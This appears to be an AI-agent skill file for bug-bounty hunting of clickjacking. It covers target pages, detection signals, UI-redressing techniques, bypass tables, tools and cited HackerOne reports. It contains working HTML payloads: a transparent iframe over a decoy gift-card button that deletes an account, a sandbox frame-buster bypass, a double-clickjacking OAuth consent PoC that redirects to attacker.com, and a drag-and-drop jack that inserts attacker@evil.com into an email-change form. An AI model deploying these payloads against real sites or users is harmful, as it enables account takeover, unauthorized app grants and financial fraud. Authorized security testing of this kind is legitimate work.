---
name: hunt-clickjacking
description: "Use this skill when a sensitive page lacks X-Frame-Options or CSP frame-ancestors directives AND the page contains a meaningful state-changing action (account delete, payment, role grant, OAuth consent, password change, MFA disable, fund transfer). Load automatically when scanning shows missing anti-framing headers AND you can identify a one-click destructive action on the page. Only invoke if real impact potential exists. Skip theoretical findings — clickjacking on /about, /pricing, marketing pages, or any page with no destructive single-click action is NOT a bug. Never report missing X-Frame-Options alone."
type: hunt
---

# Hunt: Clickjacking / UI Redressing

## Crown Jewel Targets
- **OAuth consent page frameable** — trick victim into authorizing attacker's app → ATO (Critical)
- **Account deletion confirm-page frameable** — one click = account destroyed (High)
- **Password / email change confirmation** without re-auth, frameable (High → ATO chain)
- **Fund-transfer / payment confirmation** page (High–Critical, financial impact)
- **MFA disable / device removal** confirmation (High → ATO chain)
- **Admin-role grant** page accessible to logged-in admin victim (Critical)
- **API-key generation / display** page (High — exfil via clickjack-triggered copy)
- **Webhook secret regen / disclosure** page

## Detection Signals
- Response headers MISSING or weak:
  - No `X-Frame-Options: DENY` or `SAMEORIGIN`
  - No `Content-Security-Policy: frame-ancestors 'none'` or `'self'`
  - `X-Frame-Options: ALLOW-FROM` (deprecated, ignored by modern browsers = effectively missing)
- JS frame-busting that's defeatable: `if (top != self) top.location = self.location` (bypass via `sandbox="allow-scripts"`)
- Sensitive forms with no CSRF token AND no re-auth AND no captcha
- Single-click confirm buttons on destructive actions

## Attack Techniques
1. **Classic iframe overlay** — full-page iframe target, transparent, positioned over a decoy "Click here to win" button. Victim clicks decoy, actually clicks target button underneath.
2. **Double-clickjacking (Paulos Yibelo 2025)** — trick user into starting a double-click; first click closes attacker popup, second click lands on victim's freshly-opened OAuth consent / sensitive page. Bypasses X-Frame-Options entirely.
3. **Drag-and-drop jacking** — user drags "puzzle piece" which actually drags text into a hidden form field, then submit.
4. **Cursor-jacking** — replace cursor with custom image offset from actual pointer, victim aims wrong location.
5. **Touch-jacking (mobile)** — overlay touch targets on mobile site; common against in-app browsers.
6. **Likejacking** — Facebook/social media share-button overlay.
7. **Filejacking** — invisible `<input type=file>` over decoy button captures local file upload.
8. **Cookiejacking** — combine with file:// iframe to read local cookies (legacy, mostly patched).
9. **Frame-busting bypass** — wrap target in `<iframe sandbox="allow-forms allow-scripts">` (omit `allow-top-navigation`) — top.location assignment throws, victim still sees frame.
10. **CSRF-protected page exploit** — even with CSRF tokens, clickjacking triggers the legit button which has the token already embedded.

## Payloads
**Classic clickjack PoC:**
```html
<!DOCTYPE html>
<html><head><style>
  iframe {
    width: 1000px; height: 800px;
    position: absolute; top: 0; left: 0;
    opacity: 0.0001;  /* 0 may be blocked by some browsers */
    z-index: 2;
  }
  .decoy {
    position: absolute; top: 350px; left: 420px;
    z-index: 1; font-size: 24px;
    background: #4CAF50; color: white; padding: 15px 30px;
  }
</style></head><body>
<div class="decoy">CLICK TO CLAIM $100 GIFT CARD</div>
<iframe src="https://target.com/settings/delete-account?confirm=1"></iframe>
</body></html>
```

**Frame-buster bypass (sandbox):**
```html
<iframe sandbox="allow-forms allow-scripts allow-same-origin"
        src="https://target.com/settings/delete"></iframe>
```

**Double-clickjacking PoC (2025 technique):**
```html
<!DOCTYPE html>
<html><body>
<button onclick="go()">Double-click to start</button>
<script>
function go() {
  // Open OAuth consent page in popup (top-level, no X-Frame-Options needed)
  const popup = window.open('https://target.com/oauth/authorize?client_id=ATTACKER&...', '_blank');
  // Switch parent to a page with a fake button at the EXACT same coords as OAuth "Approve"
  window.location = 'https://attacker.com/decoy-fake-approve-position.html';
  // User's second click of the double-click lands on the real OAuth Approve button
}
</script>
</body></html>
```

**Drag-and-drop jack:**
```html
<div draggable="true" ondragstart="event.dataTransfer.setData('text/plain','attacker@evil.com')">
  Drag the puzzle piece →
</div>
<iframe src="https://target.com/settings/email" style="opacity:.01"></iframe>
```

## Bypass Methods
| Defense | Bypass |
|---------|--------|
| `X-Frame-Options: SAMEORIGIN` | Find any same-origin XSS or open-redirect to host attacker page on subdomain (often `*.target.com` trusted) |
| `X-Frame-Options: ALLOW-FROM` | Ignored by Chrome/Firefox/Safari — effectively no protection |
| CSP `frame-ancestors 'self'` | Same as XFO SAMEORIGIN — pivot via same-origin XSS |
| `top != self` JS frame-buster | Sandbox iframe without `allow-top-navigation` |
| `display:none` overlay detection | Use `opacity:0.0001` instead, or `clip-path` |
| User-confirmation re-auth | Targets that re-prompt password are NOT vulnerable — find one that doesn't |
| Captcha on action | Skip — captcha kills clickjacking |
| SameSite=Strict cookies | Modern Chrome — SameSite=Lax default blocks cross-site cookies on iframes for state-changing requests; check if cookie is SameSite=None |

## Tools
```bash
# Quick header check
curl -sI https://target.com/settings/delete | grep -iE 'x-frame-options|content-security-policy'

# Clickjacker (Python)
clickjacker -u https://target.com/settings/delete -o poc.html

# Burp Suite — Clickbandit (built-in tool: Burp → Tools → Clickbandit) generates PoC interactively

# Manual PoC test
python3 -m http.server 8000   # serve PoC, open in different browser session logged into target

# CSP Evaluator (check frame-ancestors)
# https://csp-evaluator.withgoogle.com/
```

## Impact
- **Critical**: OAuth consent grant (full ATO), admin role grant, fund transfer
- **High**: Account deletion, password change confirmation, MFA disable, email change confirm
- **Medium**: Subscription change, profile-data modification with PII impact
- **NOT A BUG (always rejected)**:
  - Marketing/info pages without state-change actions
  - Pages requiring re-auth on action
  - Pages with captcha on action
  - Generic missing X-Frame-Options report with no PoC of destructive action

## Chain Potential
- **+ CSRF** = clickjacking is the user-interaction primitive that triggers a CSRF-protected action (the legit form has the token)
- **+ Open redirect / OAuth** = double-clickjack OAuth consent → ATO
- **+ Same-origin XSS** = host clickjack inside trusted origin to bypass SAMEORIGIN XFO
- **+ Subdomain takeover** = takeover of `*.target.com` allows framing inside SAMEORIGIN scope
- **+ Drag-and-drop** = combine with stored XSS sink that accepts dragged content
- **+ Cursor-jacking + file upload** = trick into uploading sensitive local file
- **+ Touch-jacking + WebView** = mobile in-app browsers, escalate to deep-link abuse

## Fallback Chain
1. If `X-Frame-Options: DENY` is set, search for sensitive actions on subdomains that lack it — many programs miss admin subdomains, staging, support panels.
2. If primary anti-framing is solid, attempt double-clickjacking (popup-based) — works regardless of XFO because target opens in top-level window.
3. If single-click attacks blocked by re-auth, look for actions that DON'T re-auth: email-change confirm, OAuth approve, GDPR-export download, API-key copy.
4. Pivot to UI-redress variants: drag-and-drop jack, cursor-jack, touch-jack on mobile site, filejack hidden uploads. Never stop because one technique failed.

## Real-World Reports (from Community Writeups)

| Title (truncated) | Program | Bounty | Source |
|---|---|---|---|
| **RCE of Burp Scanner/Crawler via Clickjacking** | PortSwigger | $3,000 | H1 #1274695 |
| Twitter Periscope Clickjacking | X / xAI | $1,120 | H1 #591432 |
| Highly wormable clickjacking in player card | X / xAI | $0 | H1 #85624 |
| Clickjacking on donation page | WordPress | $0 | H1 #921709 |
| Clickjacking in main domain topechelon.com | Top Echelon | $0 | H1 #2964441 |
| Viral DM Clickjacking via link truncation → Google creds | X / xAI | $0 | H1 #643274 |
| Sensitive Clickjacking on admin login page | Shipt | $0 | H1 #389145 |
| **Double Clickjacking on WakaTime OAuth Authorize Flow** | WakaTime | $0 | H1 #3287060 |
| Stealing user emails by clickjacking cards.twitter.com | X / xAI | $0 | H1 #154963 |
| Clickjacking vkpay | VK.com | $0 | H1 #374817 |
| Exploiting clickjacking to trigger self DOM-based XSS | Automattic | $0 | H1 #953579 |
| Clickjacking can Delete Developer APP | TikTok | $500 | H1 #1416612 |
| Clickjacking at ylands.com | Bohemia Interactive | $80 | H1 #405342 |
| Clickjacking in the admin page | Rocket.Chat | $0 | H1 #728004 |
| Clickjacking on cas.acronis.com login page | Acronis | $0 | H1 #971234 |
| CRITICAL Clickjacking Yelp Reservations → CC Misuse | Yelp | $0 | H1 #355859 |
| Clickjacking in exchangemarketplace.com | Shopify | $0 | H1 #658217 |

**PROVEN patterns** (3+ reports): clickjacking on OAuth `/authorize` endpoint → unauthorized app authorization (WakaTime, X periscope, Twitter cards), self-XSS escalated to stored via clickjack (Automattic), admin/login page lacks XFO (Shipt, Rocket.Chat, Acronis), double-clickjacking pop-up technique bypassing XFO/SAMEORIGIN.

## High-Value Chains (from Reports)

1. **Double-clickjacking on OAuth `/authorize` → unauthorized 3rd-party app grant → API access**
   - WakaTime (H1 #3287060) — popup-based double click bypassed XFO, victim approved attacker app, read all coding data.
2. **Clickjacking + self-XSS → stored XSS → account takeover**
   - Automattic api.tumblr.com (H1 #953579) — clickjack triggered self-XSS in victim browser, exfiltrated session.
3. **Clickjacking → desktop client RCE (Burp Scanner browser)**
   - PortSwigger (H1 #1274695, $3k) — framed Burp's internal browser context, triggered file-handler RCE chain.
4. **Clickjack admin app deletion / destructive action**
   - TikTok (H1 #1416612, $500) — victim developer's app deleted via framed admin button.
5. **Sensitive form clickjack → CC/PII exposure**
   - Yelp Reservations (H1 #355859) — framed reservation form captured victim payment & contact info.
